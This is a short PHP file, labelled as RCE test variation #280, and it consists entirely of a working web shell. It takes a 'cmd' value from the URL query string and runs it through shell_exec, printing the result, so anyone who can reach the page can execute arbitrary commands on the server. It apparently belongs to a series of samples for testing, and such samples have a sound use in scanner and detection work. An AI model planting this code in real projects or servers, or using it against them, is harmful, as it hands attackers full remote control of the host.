<?php
// RCE test variation #280
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>